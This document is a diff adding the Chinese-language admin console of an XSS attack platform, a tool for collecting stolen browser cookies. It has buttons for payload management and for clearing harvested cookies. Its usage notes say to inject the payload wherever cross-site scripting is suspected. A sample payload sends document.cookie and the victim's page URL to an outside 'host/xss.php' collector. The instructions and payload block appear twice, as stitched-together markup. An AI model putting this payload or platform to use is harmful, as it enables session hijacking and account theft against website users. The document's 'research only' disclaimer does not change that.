@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
+<meta http-equiv="Cache-Control" content="no-cache"/>
+<meta http-equiv="Expires" content="0"/>
+<title>太乙漏洞扫描系统</title>
+
+<style>
+body,ul,li{
+	margin:0; padding:0; 
+	font:12px/1.5 arial;
+	}
+ul,li{
+	list-style:none;
+	}
+.wrap{
+	width:93%; 
+	margin:15px auto;
+	}
+.hide{
+	display:none;
+	}
+#tab_t{
+	height:25px;
+	border-bottom:1px solid #ccc;
+	}
+#tab_t li{
+	float:left; 
+	width:80px; 
+	height:24px; 
+	line-height:24px; 
+	margin:0 4px; 
+	text-align:center; 
+	border:1px solid #ccc; 
+	border-bottom:none; 
+	background:#f5f5f5; 
+	cursor:pointer
+	}
+#tab_t .act{ 
+	position:relative; 
+	height:25px; 
+	margin-bottom:-1px; 
+	background:#fff;
+	}
+#tab_c{
+	border:1px solid #ccc; 
+	border-top:none; 
+	padding:20px;
+	}
+
+/* button */
+button {
+	-moz-box-shadow:inset 0px 0px 0px 0px #91b8b3;
+	-webkit-box-shadow:inset 0px 0px 0px 0px #91b8b3;
+	box-shadow:inset 0px 0px 0px 0px #91b8b3;
+	background-color:#a3a3a3;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:10px;
+	font-weight:bold;
+	padding:2px 2px;
+	text-decoration:none;
+	text-shadow:0px 0px 0px #2b665e;
+}
+button:hover {
+	background-color:#6c7c7c;
+}
+button:active {
+	position:relative;
+	top:1px;
+}
+</style>
+
+<script>
+
+function changeTab(t){
+    tab("tab_t","li","tab_c","div","onclick",3,t);
+    function tab(tab_t,tab_t_tag,tab_c,tag_c_tag,evt,c,t){
+        var tab_t = document.getElementById(tab_t);
+        var tab_t_li = tab_t.getElementsByTagName(tab_t_tag);
+        var tab_c = document.getElementById(tab_c);
+        var tab_c_li = tab_c.getElementsByTagName(tag_c_tag);
+        var len = tab_t_li.length;
+        var i=0;
+        for(i=0; i<len; i++){
+            tab_t_li[i].index = i;
+            tab_t_li[i][evt] = function(){
+				location.href = "?console="+this.index;
+                for(i=0; i<len; i++){
+                    tab_t_li[i].className = "";
+                    tab_c_li[i].className = "hide";
+                }
+                tab_t_li[this.index].className = "act";
+                tab_c_li[this.index].className = "";
+            }
+        }
+		if ( t != null ){
+			for(i=0; i<len; i++){
+				tab_t_li[i].className = "";
+				tab_c_li[i].className = "hide";
+			}
+			tab_t_li[t].className = "act";
+			tab_c_li[t].className = "";
+		}
+    }
+
+}
+
+function delCred(id){
+	if( confirm("是否确定要删除?") ){
+		var xmlhttp;
+		if (window.XMLHttpRequest){
+		  xmlhttp=new XMLHttpRequest();
+		}else{
+		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+		}
+		var delCred = "?delCred="+id;
+		xmlhttp.open("GET",delCred,true);
+		xmlhttp.send();
+		refresh()
+	}
+}
+
+function delPayload(id){
+	if( confirm("是否确定要删除?") ){
+		var xmlhttp;
+		if (window.XMLHttpRequest){
+		  xmlhttp=new XMLHttpRequest();
+		}else{
+		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+		}
+		var delPayload = "?delPayload="+id;
+		xmlhttp.open("GET",delPayload,true);
+		xmlhttp.send();
+		refresh();
+	}
+}
+
+function clipe(obj){
+	alert(obj);	
+	window.clipboardData.setData("Text",content);
+}
+
+function install(){
+	if( confirm( "将删除原有数据并重新建立数据表，是否继续？" ) ){
+		location.href="?install";
+	}
+}
+
+function refresh(){
+	location.href=location.href
+}
+
+function editPayload(id){
+	window.open("?editPayload="+id,"","height=450,width=500,scrollbars=yes,status =yes");	
+}
+
+function openSession(id){
+	window.open("?open="+id)
+}
+
+//setTimeout("refresh()",5000);
+
+</script>
+
+</head>
+<body onload="changeTab('.$t.')">
+	<div class="wrap">
+		<ul id="tab_t">
+			<li class="act">会话</li>
+			<!--li>项目</li-->
+			<li>载荷</li>
+			<li>配置</li>
+		</ul>
+		<hr/>
+		<div id="tab_c">
+<div>
+</div>
+			<!--div class="hide">Projects</div-->
+			<div class="hide">
+				<button onclick="editPayload(\'new\')">添加载荷</button>
+				<button onclick="delPayload(\'*\')">清空载荷</button>
+				<button onclick="delCred(\'*\')">清空Cookie</button>
+				<button onclick="install()">初始化数据库</button>
+				<button onclick="javascript:location.href=\'?logout\'">注销登录</button>
+				<p><b>小白龙跨站攻击平台</b> 版本 2.0.2<br/>
+				使用说明:<br/>
+				<em>1.安装</em><br/>
+				1).在脚本中配置用户名和密码，以及数据库选项<br/>
+				2).配置好上述选项后点击初始化数据库<br/>
+				
+				<br/><em>2.使用</em><br/>
+				1).点击"地址"按钮获取到数据库中的载荷地址<br/>
+				2).在疑似存在跨站攻击的地方以你喜欢的姿势插入即可<br/>
+				
+				<br/><em>3.载荷接口字段</em><br/>
+				1).cookie 接收POST和GET到的COOKIE<br/>
+				2).location 接收POST和GET到的XSS攻击页面地址<br/>
+				<br/><em>4.载荷范例</em><br/>
+<pre>
+	//创建xmlhttp对象
+	var xmlhttp; 
+	if (window.XMLHttpRequest){ 
+		xmlhttp=new XMLHttpRequest(); 
+	}else{ 
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
+	} 
+	//配置接口信息和数据
+	var dst = "http://host/xss.php?cookie="+encodeURIComponent(document.cookie)+"&location="+encodeURIComponent(top.location.href); 
+	//以get方式发送数据
+	xmlhttp.open("GET",dst,true); 
+	xmlhttp.send(); </pre>
+				<br/><em>5.声明</em><br/>
+				本程序仅供用作安全研究，请勿用于非法用途，对于使用本工具造成的一切损害，本人不承担任何责任。<br/>
+				作者博客: <a href="http://www.chorder.net">http://www.chorder.net</a><br/>
+				Chorder # 2015年12月<br/></p>
+			</div>
+		</div>
+	</div>
+	</div>
+			<!--div class="hide">Projects</div-->
+			<div class="hide">
+				<button onclick="editPayload(\'new\')">添加载荷</button>
+				<button onclick="delPayload(\'*\')">清空载荷</button>
+				<button onclick="delCred(\'*\')">清空Cookie</button>
+				<button onclick="install()">初始化数据库</button>
+				<button onclick="javascript:location.href=\'?logout\'">注销登录</button>
+				<p><b>小白龙跨站攻击平台</b> 版本 2.0.2<br/>
+				使用说明:<br/>
+				<em>1.安装</em><br/>
+				1).在脚本中配置用户名和密码，以及数据库选项<br/>
+				2).配置好上述选项后点击初始化数据库<br/>
+				
+				<br/><em>2.使用</em><br/>
+				1).点击"地址"按钮获取到数据库中的载荷地址<br/>
+				2).在疑似存在跨站攻击的地方以你喜欢的姿势插入即可<br/>
+				
+				<br/><em>3.载荷接口字段</em><br/>
+				1).cookie 接收POST和GET到的COOKIE<br/>
+				2).location 接收POST和GET到的XSS攻击页面地址<br/>
+				<br/><em>4.载荷范例</em><br/>
+<pre>
+	//创建xmlhttp对象
+	var xmlhttp; 
+	if (window.XMLHttpRequest){ 
+		xmlhttp=new XMLHttpRequest(); 
+	}else{ 
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
+	} 
+	//配置接口信息和数据
+	var dst = "http://host/xss.php?cookie="+encodeURIComponent(document.cookie)+"&location="+encodeURIComponent(top.location.href); 
+	//以get方式发送数据
+	xmlhttp.open("GET",dst,true); 
+	xmlhttp.send(); </pre>
+				<br/><em>5.声明</em><br/>
+				本程序仅供用作安全研究，请勿用于非法用途，对于使用本工具造成的一切损害，本人不承担任何责任。<br/>
+				作者博客: <a href="http://www.chorder.net">http://www.chorder.net</a><br/>
+				Chorder # 2015年12月<br/></p>
+			</div>
+		</div>
+	</div>
+	</body>
+</html>
